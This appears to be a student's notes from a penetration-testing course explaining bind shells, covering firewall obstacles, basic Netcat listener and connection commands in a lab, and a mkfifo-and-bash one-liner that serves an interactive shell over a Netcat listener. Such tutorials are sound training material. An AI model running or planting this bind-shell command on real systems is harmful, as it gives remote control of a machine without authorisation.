With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).

we would connect directly with the IP address and port listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:

    There would have to be a listener already started on the target.
    If there is no listener started, we would need to find a way to make this happen.
    Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
    Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

The application used to start the listener is called GNU Netcat.
Netcat (nc) is considered our Swiss-Army Knife since it can function over TCP, UDP, and Unix sockets.
It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output.

__________________________
Practicing with GNU Netcat

we will be using netcat (nc) on the client and server.

Once connected to the target box with ssh, start a Netcat listener:
No. 1: Server - Target starting Netcat listener
Cmd:
nc -lvnp 7777

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

No. 2: Client - Attack box connecting to target
Cmd:
nc -nv 10.129.41.200 7777

--->>>
Notice how we are using nc on the client and the server.
On the client-side, we specify the server's IP address and the port that we configured to listen on (7777).
Once we successfully connect, we can see a succeeded! message on the client 
--->>>

No. 3: Server - Target receiving connection from client
Cmd:
nc -lvnp 7777
Result:
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    

------Note------
This is not a proper shell. It is just a Netcat TCP session we have established.
-----

No. 4: Client - Attack box sending message Hello Academy
Cmd:
nc -nv 10.129.41.200 7777

No. 5: Server - Target receiving Hello Academy message
Cmd:
nc -lvnp 7777

__________________________
Establishing a Basic Bind Shell with Netcat

On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and
input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

No. 1: Server - Binding a Bash shell to the TCP session
Cmd:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

No. 2: Client - Connecting to bind shell on target
Cmd:
nc -nv 10.129.41.200 7777

